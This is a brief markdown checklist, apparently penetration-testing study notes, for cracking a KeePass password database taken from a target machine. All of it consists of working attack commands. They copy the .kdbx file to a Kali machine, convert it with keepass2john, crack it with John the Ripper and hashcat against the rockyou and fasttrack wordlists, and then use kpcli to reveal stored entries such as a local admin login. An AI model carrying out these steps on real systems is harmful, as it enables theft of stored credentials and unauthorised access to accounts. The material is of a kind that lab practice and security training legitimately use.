
- [ ] Transfer the `.kdbx` file from Target Machine to your Kali Machine

- [ ] Convert the KeePass database into a format that can be used for cracking with `keepass2john` on your Kali Machine
```
keepass2john Database.kdbx > keepass.hash
```

- [ ] Crack the KeePass database with `JtR` on your Kali Machine
```
john --wordlist=/usr/share/wordlists/rockyou.txt keepass.hash
```
```
john --wordlist=/usr/share/wordlists/fasttrack.txt keepass.hash
```

- [ ] Crack the KeePass database with `Hashcat` on your Kali Machine
```
hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force
```

- [ ] List groups and entries of KeePass database file with `kpcli` on your Kali Machine
```
kpcli --kdb=Database.kdbx
ls
cd 'Database/Windows'
show -f 0
show -f "LOGIN local admin"
```